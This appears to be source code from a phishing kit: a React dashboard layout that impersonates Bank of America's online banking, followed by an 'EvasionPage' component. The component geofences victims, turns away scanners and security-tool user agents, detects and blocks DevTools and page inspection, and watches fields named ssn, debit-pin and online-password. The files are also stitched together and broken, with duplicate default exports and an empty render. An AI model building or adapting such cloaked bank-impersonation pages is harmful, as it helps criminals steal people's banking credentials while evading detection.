import { ReactNode } from "react";
import { useAuth } from "@/contexts/AuthContext";
import { Navigate, useNavigate, useLocation, Link } from "react-router-dom";
import {
  Home, ArrowLeftRight, Receipt, Settings, LogOut,
  CreditCard, PiggyBank, Search, Menu, X, FileText, FileDown
} from "lucide-react";
import { useState } from "react";

import { SiteLogo } from "@/components/SiteLogo";

const navItems = [
  { label: "Accounts", icon: Home, path: "/dashboard" },
  { label: "Pay & Transfer", icon: ArrowLeftRight, path: "/transfers" },
  { label: "Bill Pay", icon: Receipt, path: "/bill-pay" },
  { label: "Credit Cards", icon: CreditCard, path: "/credit-cards" },
  { label: "Investments", icon: PiggyBank, path: "/investments" },
  { label: "Settings", icon: Settings, path: "/settings" },
];

const DashboardLayout = ({ children }: { children: ReactNode }) => {
  const { user, logout, isAuthenticated, isLoggingOut } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  if (!isAuthenticated) return <Navigate to="/login" replace />;

  const handleLogout = async () => {
    await logout();
    navigate("/");
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Top header - white, Bank of America style */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          {/* Top row: Logo (left) | Inbox, Products, Profile, Log Out (right) */}
          <div className="flex items-center justify-between py-3 gap-4">
            <button
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              className="flex flex-col items-center gap-0.5 text-gray-700 hover:text-[#E31837] md:hidden flex-shrink-0"
            >
              <Menu className="h-6 w-6" />
              <span className="text-[10px]">Menu</span>
            </button>
            {/* Logo - top left (traditional placement). To increase size change className e.g. h-10 or h-12 */}
            <Link to="/dashboard" className="flex-shrink-0" style={{ background: "transparent" }}>
              <SiteLogo className="h-9 object-contain" />
            </Link>
            <div className="hidden md:flex items-center gap-6 ml-auto">
              <Link to="/inbox" className="flex flex-col items-center gap-0.5 text-gray-700 hover:text-[#E31837] relative py-1 pr-1">
                <span className="text-xl">✉</span>
                <span className="text-xs">Inbox</span>
                <span className="absolute top-0 right-0 bg-[#E31837] text-white text-[10px] font-bold rounded-full h-4 w-4 flex items-center justify-center min-w-[1rem] leading-none">3</span>
              </Link>
              <Link to="/products" className="flex flex-col items-center gap-0.5 text-gray-700 hover:text-[#E31837]">
                <span className="text-xl">🛒</span>
                <span className="text-xs">Products</span>
              </Link>
              <Link to="/profile" className="flex flex-col items-center gap-0.5 text-gray-700 hover:text-[#E31837]">
                <span className="text-sm font-medium">Profile</span>
              </Link>
              <button
                onClick={handleLogout}
                className="flex flex-col items-center gap-0.5 text-gray-700 hover:text-[#E31837]"
              >
                <LogOut className="h-5 w-5" />
                <span className="text-xs">Log Out</span>
              </button>
            </div>
          </div>

          {/* Tabs: Accounts */}
          <div className="flex border-b border-gray-200 -mb-px">
            <Link
              to="/dashboard"
              className={`px-6 py-3 text-sm font-semibold border-b-2 transition-colors ${
                location.pathname === "/dashboard"
                  ? "border-[#E31837] text-[#E31837]"
                  : "border-transparent text-gray-500 hover:text-gray-700"
              }`}
            >
              Accounts
            </Link>
          </div>

          {/* Search bar */}
          <div className="pb-3">
            <div className="relative max-w-xl">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
              <input
                type="text"
                placeholder="How can we help?"
                className="w-full pl-10 pr-12 py-2.5 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#E31837]/30 focus:border-[#E31837]"
              />
              <div className="absolute right-2 top-1/2 -translate-y-1/2 h-8 w-8 rounded-full bg-[#E31837] flex items-center justify-center cursor-pointer text-white">
                <Search className="h-4 w-4" />
              </div>
            </div>
          </div>
        </div>

        {/* Mobile menu */}
        {mobileMenuOpen && (
          <div className="md:hidden border-t border-gray-200 bg-white py-2 animate-fade-in">
            <Link to="/inbox" onClick={() => setMobileMenuOpen(false)} className="flex items-center gap-3 px-6 py-3 text-sm text-gray-700">
              ✉ Inbox
            </Link>
            <Link to="/products" onClick={() => setMobileMenuOpen(false)} className="flex items-center gap-3 px-6 py-3 text-sm text-gray-700">
              🛒 Products
            </Link>
            <Link to="/profile" onClick={() => setMobileMenuOpen(false)} className="flex items-center gap-3 px-6 py-3 text-sm text-gray-700">
              Profile
            </Link>
            {navItems.map(({ label, icon: Icon, path }) => (
              <Link
                key={path}
                to={path}
                onClick={() => setMobileMenuOpen(false)}
                className={`flex items-center gap-3 px-6 py-3 text-sm ${
                  location.pathname === path ? "text-[#E31837] font-semibold bg-red-50" : "text-gray-700"
                }`}
              >
                <Icon className="h-4 w-4" />
                {label}
              </Link>
            ))}
            <button
              onClick={() => { handleLogout(); setMobileMenuOpen(false); }}
              className="flex items-center gap-3 px-6 py-3 text-sm text-gray-700 w-full border-t border-gray-200"
            >
              <LogOut className="h-4 w-4" />
              Log Out
            </button>
          </div>
        )}
      </header>

      {/* Main content */}
      <main className="flex-1 px-4 sm:px-6 py-6">
        <div className="max-w-7xl mx-auto">
          {children}
        </div>
      </main>

      {/* Bottom nav - mobile (Bank of America style) */}
      <nav className="md:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 py-2 px-2 flex items-center justify-around z-50">
        <Link
          to="/dashboard"
          className={`flex flex-col items-center gap-1 py-2 ${
            location.pathname === "/dashboard" ? "text-[#012169] font-semibold" : "text-gray-500"
          }`}
        >
          <span className="text-lg">$</span>
          <span className="text-[10px]">Accounts</span>
        </Link>
        <Link
          to="/transfers"
          className={`flex flex-col items-center gap-1 py-2 ${
            location.pathname === "/transfers" ? "text-[#012169] font-semibold" : "text-gray-500"
          }`}
        >
          <ArrowLeftRight className="h-5 w-5" />
          <span className="text-[10px]">Pay & Transfer</span>
        </Link>
        <Link
          to="/bill-pay"
          className={`flex flex-col items-center gap-1 py-2 ${
            location.pathname === "/bill-pay" ? "text-[#012169] font-semibold" : "text-gray-500"
          }`}
        >
          <FileDown className="h-5 w-5" />
          <span className="text-[10px]">Deposit Checks</span>
        </Link>
        <Link
          to="/investments"
          className={`flex flex-col items-center gap-1 py-2 ${
            location.pathname === "/investments" ? "text-[#012169] font-semibold" : "text-gray-500"
          }`}
        >
          <PiggyBank className="h-5 w-5" />
          <span className="text-[10px]">Invest</span>
        </Link>
      </nav>

      {/* Add padding for mobile bottom nav */}
      <div className="h-20 md:hidden" />

      {/* Footer - desktop */}
      <footer className="hidden md:block bg-white border-t border-gray-200 py-4 px-6">
        <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-2 text-xs text-gray-600">
          <div className="flex gap-4">
            <span className="cursor-pointer hover:text-[#E31837]">Privacy</span>
            <span className="cursor-pointer hover:text-[#E31837]">Security Center</span>
            <span className="cursor-pointer hover:text-[#E31837]">Terms</span>
          </div>
          <span>© 2026 Bank of America Corporation. Member FDIC. Equal Housing Lender.</span>
        </div>
      </footer>

      {/* Logout Loading Modal */}
      {isLoggingOut && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-8 text-center max-w-sm w-full mx-4">
            <div className="animate-spin rounded-full h-12 w-12 border-4 border-[#E31837] border-transparent border-t-[#E31837] mx-auto mb-4"></div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Logging out</h3>
            <p className="text-gray-600">Please wait...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default DashboardLayout;
export default Learning;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

 
}